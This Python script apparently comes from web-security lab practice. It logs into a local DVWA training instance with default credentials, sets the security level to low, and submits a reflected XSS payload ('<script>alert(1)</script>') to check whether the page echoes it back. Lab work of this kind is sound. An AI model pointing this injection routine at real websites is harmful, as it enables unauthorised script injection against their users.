# debug_xss3.py
import requests
from bs4 import BeautifulSoup

def login_dvwa(session):
    login_url = "http://localhost/dvwa/login.php"
    response = session.get(login_url)
    soup = BeautifulSoup(response.text, "html.parser")
    token_input = soup.find("input", {"name": "user_token"})
    token = token_input["value"] if token_input else ""
    session.post(login_url, data={
        "username": "admin",
        "password": "password",
        "Login": "Login",
        "user_token": token
    }, allow_redirects=True)

session = requests.Session()
session.headers.update({"User-Agent": "Mozilla/5.0"})
login_dvwa(session)
print("[*] Logged in")

# Set security level via DVWA settings page (correct way - no cookie conflict)
security_url = "http://localhost/dvwa/security.php"
resp = session.get(security_url)
soup = BeautifulSoup(resp.text, "html.parser")
token_input = soup.find("input", {"name": "user_token"})
token = token_input["value"] if token_input else ""
session.post(security_url, data={
    "security": "low",
    "seclev_submit": "Submit",
    "user_token": token
})
print("[*] Security level set to low via settings page")

# Show all cookies
print(f"[*] Cookies: {[(c.name, c.value) for c in session.cookies]}")

target = "http://localhost/dvwa/vulnerabilities/xss_r/"
payload = "<script>alert(1)</script>"

# Get fresh page + token
response = session.get(target)
soup = BeautifulSoup(response.text, "html.parser")
token_input = soup.find("input", {"name": "user_token"})
token = token_input["value"] if token_input else ""
print(f"[*] Fresh token: {token[:20]}...")

# Submit payload
params = {"name": payload, "user_token": token}
result = session.get(target, params=params)

print(f"[*] Status: {result.status_code}")
print(f"[*] Payload in response: {payload in result.text}")

soup2 = BeautifulSoup(result.text, "html.parser")
vuln_div = soup2.find("div", {"class": "vulnerable_code_area"})
if vuln_div:
    print(f"[*] Vulnerable area content:\n{vuln_div.text.strip()}")
else:
    print("[*] Response snippet:")
    print(result.text[2000:3000])
